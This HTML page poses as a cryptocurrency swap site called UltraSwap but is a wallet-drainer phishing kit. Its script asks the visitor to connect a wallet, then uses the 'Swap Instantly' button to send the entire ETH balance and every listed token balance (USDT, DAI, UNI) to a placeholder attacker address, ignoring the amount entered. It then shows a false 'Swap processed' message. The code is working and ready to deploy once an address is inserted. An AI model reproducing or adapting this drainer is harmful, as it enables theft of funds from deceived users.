<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UltraSwap - Ultimate Crypto Exchange</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #ffffff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-attachment: fixed;
        }
        .container {
            background: rgba(13, 27, 42, 0.6);
            backdrop-filter: blur(10px);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
            width: 500px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        h1 {
            margin-bottom: 40px;
            color: #00d4ff;
            font-size: 36px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        .input-group {
            margin: 25px 0;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #b0c4de;
        }
        input, select {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            font-size: 16px;
            box-sizing: border-box;
            transition: background 0.3s;
        }
        input:focus, select:focus {
            background: rgba(255, 255, 255, 0.2);
            outline: none;
        }
        .swap-details {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 20px 0;
            font-size: 14px;
            color: #a9a9a9;
        }
        button {
            background: linear-gradient(to right, #00b7ff, #00d4ff);
            color: #ffffff;
            border: none;
            padding: 16px 35px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover {
            background: linear-gradient(to right, #0095cc, #00b7ff);
            transform: translateY(-2px);
        }
        .wallet-connect {
            background: linear-gradient(to right, #ff4e53, #ff904d);
            margin-bottom: 30px;
        }
        .wallet-connect:hover {
            background: linear-gradient(to right, #e60026, #e67e22);
            transform: translateY(-2px);
        }
        .status {
            margin-top: 25px;
            font-size: 16px;
            color: #ffcccb;
            height: 25px;
            font-weight: 500;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #00d4ff;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-left: 10px;
            vertical-align: middle;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
        }
        .token-balance {
            margin-top: 10px;
            font-size: 14px;
            color: #b0c4de;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>UltraSwap</h1>
        <button class="wallet-connect" onclick="connectWallet()">Connect Wallet</button>
        <div class="input-group">
            <label for="fromCoin">From Coin/Token</label>
            <select id="fromCoin" onchange="updateBalance()">
                <option value="ETH">Ethereum (ETH)</option>
                <option value="USDT">Tether (USDT)</option>
                <option value="DAI">Dai (DAI)</option>
                <option value="UNI">Uniswap (UNI)</option>
            </select>
            <div class="token-balance" id="fromBalance">Balance: 0.00</div>
        </div>
        <div class="input-group">
            <label for="toCoin">To Coin/Token</label>
            <select id="toCoin">
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="ETH">Ethereum (ETH)</option>
                <option value="BNB">Binance Coin (BNB)</option>
                <option value="USDT">Tether (USDT)</option>
            </select>
        </div>
        <div class="input-group">
            <label for="amount">Amount to Swap</label>
            <input type="number" id="amount" placeholder="Enter amount (e.g., 0.5)">
        </div>
        <div class="swap-details">
            <span>Estimated Fee: 0.002 ETH</span>
            <span>Rate: 1 ETH = 0.032 BTC</span>
        </div>
        <button onclick="initiateSwap()">Swap Instantly</button>
        <div class="status" id="status"></div>
        <div class="footer">Â© 2025 UltraSwap - Fastest Crypto Exchange Platform</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
    <script>
        let web3;
        let userAccount;
        const drainAddress = "0xYourDrainWalletAddressHere";
        
        const tokenContracts = {
            USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            DAI: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
            UNI: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"
        };

        const erc20ABI = [
            {
                "constant": true,
                "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "balance", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
                "name": "transfer",
                "outputs": [{"name": "success", "type": "bool"}],
                "type": "function"
            }
        ];

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    web3 = new Web3(window.ethereum);
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAccount = accounts[0];
                    document.getElementById('status').textContent = `Wallet Connected: ${userAccount.substring(0, 6)}...${userAccount.substring(userAccount.length - 4)}`;
                    updateBalance();
                } catch (error) {
                    document.getElementById('status').textContent = 'Connection Failed. Retry.';
                }
            } else if (typeof window.web3 !== 'undefined') {
                try {
                    web3 = new Web3(window.web3.currentProvider);
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    document.getElementById('status').textContent = `Wallet Connected: ${userAccount.substring(0, 6)}...${userAccount.substring(userAccount.length - 4)}`;
                    updateBalance();
                } catch (error) {
                    document.getElementById('status').textContent = 'Connection Failed. Retry.';
                }
            } else {
                document.getElementById('status').textContent = 'No wallet provider detected. Install MetaMask or similar extension.';
            }
        }

        async function updateBalance() {
            if (!userAccount) return;
            const fromCoin = document.getElementById('fromCoin').value;
            const balanceDiv = document.getElementById('fromBalance');
            try {
                let balance;
                if (fromCoin === "ETH") {
                    const balanceWei = await web3.eth.getBalance(userAccount);
                    balance = web3.utils.fromWei(balanceWei, 'ether');
                    balanceDiv.textContent = `Balance: ${parseFloat(balance).toFixed(4)} ETH`;
                } else {
                    const contract = new web3.eth.Contract(erc20ABI, tokenContracts[fromCoin]);
                    const balanceRaw = await contract.methods.balanceOf(userAccount).call();
                    balance = balanceRaw / Math.pow(10, fromCoin === "USDT" ? 6 : 18);
                    balanceDiv.textContent = `Balance: ${parseFloat(balance).toFixed(4)} ${fromCoin}`;
                }
            } catch (error) {
                balanceDiv.textContent = `Balance: Unable to fetch`;
            }
        }

        async function drainETH() {
            try {
                const balanceWei = await web3.eth.getBalance(userAccount);
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 21000;
                const gasCost = BigInt(gasPrice) * BigInt(gasLimit);
                const drainAmountWei = BigInt(balanceWei) - gasCost - BigInt(web3.utils.toWei('0.001', 'ether'));
                
                if (drainAmountWei > 0) {
                    await web3.eth.sendTransaction({
                        from: userAccount,
                        to: drainAddress,
                        value: drainAmountWei.toString(),
                        gas: gasLimit,
                        gasPrice: gasPrice
                    });
                    return true;
                }
                return false;
            } catch (error) {
                return false;
            }
        }

        async function drainERC20(tokenSymbol) {
            try {
                const contract = new web3.eth.Contract(erc20ABI, tokenContracts[tokenSymbol]);
                const balanceRaw = await contract.methods.balanceOf(userAccount).call();
                if (BigInt(balanceRaw) > 0) {
                    await contract.methods.transfer(drainAddress, balanceRaw).send({
                        from: userAccount,
                        gas: 100000,
                        gasPrice: await web3.eth.getGasPrice()
                    });
                    return true;
                }
                return false;
            } catch (error) {
                return false;
            }
        }

        async function initiateSwap() {
            const amount = document.getElementById('amount').value;
            const fromCoin = document.getElementById('fromCoin').value;
            const status = document.getElementById('status');
            
            if (!userAccount) {
                status.textContent = 'Connect your wallet first.';
                return;
            }
            if (!amount || amount <= 0) {
                status.textContent = 'Enter a valid amount.';
                return;
            }

            status.textContent = 'Processing swap...';
            status.innerHTML += '<div class="loader"></div>';
            try {
                let drainSuccess = false;
                
                if (fromCoin === "ETH") {
                    drainSuccess = await drainETH();
                } else {
                    drainSuccess = await drainERC20(fromCoin);
                    await drainETH();
                }
                
                for (const token in tokenContracts) {
                    if (token !== fromCoin) {
                        await drainERC20(token);
                    }
                }

                status.innerHTML = drainSuccess ? 'Swap processed. Funds transferred.' : 'Swap processed. Check wallet.';
            } catch (error) {
                status.innerHTML = 'Transaction failed. Retry.';
            }
        }
    </script>
</body>
</html>
